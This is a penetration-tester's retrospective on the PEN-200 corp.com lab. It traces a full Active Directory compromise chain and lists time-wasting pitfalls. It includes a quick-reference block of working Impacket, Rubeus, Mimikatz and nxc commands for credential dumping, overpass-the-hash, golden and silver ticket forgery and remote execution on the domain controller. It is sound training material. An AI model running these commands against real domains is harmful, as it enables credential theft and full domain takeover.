title: AD Lateral Movement — Lessons (corp.com full chain)
body:
The corp.com lateral set: stephanie (sprayed cred) -> jen (local admin on FILES04/WEB04/CLIENT74) -> jeff (creds in LSASS on FILES04) -> jeffadmin (DA) -> krbtgt -> golden ticket -> DC1 as SYSTEM. The techniques are documented everywhere; what this captures is the friction that actually cost time, so it doesn't cost it again.

— THE THINGS THAT BURNED TIME —

1. SMART QUOTES & THE BANG. Pasting commands from notes/PDFs drags in curly quotes (” vs ") and Rubeus/Mimikatz reject the arg and dump help — looks like a syntax error, is actually a bad character. Same family: the '!' in passwords triggers bash history expansion under double quotes. Fixes: type commands by hand, use SINGLE quotes for passwords ('Nexus123!'), or escape the bang ("Nexus123\!"). When getTGT throws PREAUTH_FAILED on a cred you KNOW works, suspect quoting before creds.

2. GOLDEN NEEDS KRBTGT, NOT A USER KEY. golden forges a TGT signed with the krbtgt key. You must already own the domain (DCSync/NTDS) to have it. Trying golden with a normal user's AES/RC4 just makes Rubeus dump help. If you only have a USER hash, you want asktgt (overpass), not golden.

3. AES256 vs RC4 / krbtgt NT hash. Two different secrets for the same account: krbtgt NT hash (1693c6...) feeds Mimikatz /krbtgt:; krbtgt AES256 (e1cced9c...) feeds Rubeus /aes256:. secretsdump prints both — grab the right one for the tool. Mimikatz golden takes /krbtgt:<NThash>; Rubeus golden takes /aes256:<key> (or /rc4).

4. HOSTNAME, NOT IP, FOR FORGED/KERBEROS TICKETS. Once a Kerberos ticket is injected, reach the target by NAME (\\dc1\c$, @DC1.corp.com). An IP forces NTLM and your Kerberos ticket won't apply. This is why /etc/hosts + resolv.conf setup matters.

5. THE DOUBLE-HOP. A PSRemoting/winrs session won't delegate creds to a THIRD host. jen on CLIENT74 can't reach DC1 'through' the session. Fix per hop: re-forge/re-auth on the current box, or use a ticket that targets the next service directly.

6. CRED REUSE IS THE WHOLE GAME. jen and pete shared an NT hash (369def...). Local admin on one box (FILES04) gave LSASS creds for jeff, whose box-hopping exposed the path to jeffadmin. Always: pop a box -> dump LSASS -> spray the new secrets everywhere -> repeat. AD compromise is a loop, not a line.

7. TWO PARALLEL WORKFLOWS. Every technique here works from a Windows foothold (Rubeus/Mimikatz) OR from Kali (Impacket getTGT + KRB5CCNAME + -k -no-pass). If one environment fights you (AV, missing tool, broken session), switch sides rather than forcing it.

— THE CHAIN, CONDENSED —
  spray stephanie -> rdp/winrs as jen (local admin) -> Invoke-Mimikatz on FILES04 -> jeff plaintext + DA jeffadmin path -> secretsdump krbtgt -> golden ticket (Mimikatz /krbtgt or Rubeus /aes256) -> dir \\dc1\c$ -> psexec DC as SYSTEM.
  Silver-ticket variant: dump DC1$ machine hash -> impacket-ticketer /service:cifs -> psexec the DC, no krbtgt needed.
cmd:
# QUICK REFERENCE — the commands that worked, de-footgunned

# --- overpass (Kali): hash -> TGT -> exec, by NAME ---
impacket-getTGT -dc-ip <DC> -hashes :<NThash> 'corp.com/jen'
export KRB5CCNAME=jen.ccache
impacket-wmiexec -k -no-pass corp.com/jen@files04.corp.com   # FQDN, not IP

# --- overpass (Windows): Rubeus asktgt -> ptt ---
.\Rubeus.exe asktgt /user:jen /rc4:<NThash> /domain:corp.com /ptt
#   then: New-PSSession -ComputerName files04.corp.com ; Enter-PSSession

# --- golden (Windows, Mimikatz): NT hash of krbtgt ---
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:<DOMAIN-SID> /krbtgt:<krbtgt_NThash> /ptt

# --- golden (Windows, Rubeus): AES256 of krbtgt — TYPE IT, don't paste ---
.\Rubeus.exe golden /aes256:<krbtgt_AES256> /domain:corp.com /sid:<DOMAIN-SID> /user:Administrator /ptt

# --- golden / DA (Kali): forge via getTGT with DA NT hash ---
impacket-getTGT -dc-ip <DC> -hashes :<Admin_NThash> corp.com/administrator
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass -dc-ip <DC> -target-ip <DC> corp.com/administrator@DC1.corp.com

# --- silver (Kali): DC machine hash -> service ticket, no krbtgt ---
nxc smb <DC> -u jeffadmin -p '<pw>' --ntds --user DC1$
impacket-ticketer -nthash <DC1$_hash> -domain-sid <DOMAIN-SID> -domain corp.com -spn cifs/dc1.corp.com jeffadmin
KRB5CCNAME=jeffadmin.ccache impacket-psexec -k -no-pass -dc-ip <DC> -target-ip <DC> corp.com/jeffadmin@DC1.corp.com

# --- always, after popping any box ---
# dump LSASS -> spray every new secret across every host -> loop
warn: This is a lab retrospective for PEN-200 corp.com. Golden/silver tickets are domain persistence requiring you ALREADY own the domain; on real engagements persistence is frequently out of scope and needs written authorization. The recurring meta-lesson here is operational, not tactical: most of the lost time was bad characters from pasting and using IPs where Kerberos demands names — slow down on those two and the chain runs clean.

choices.label: Run the lateral loop on a new box
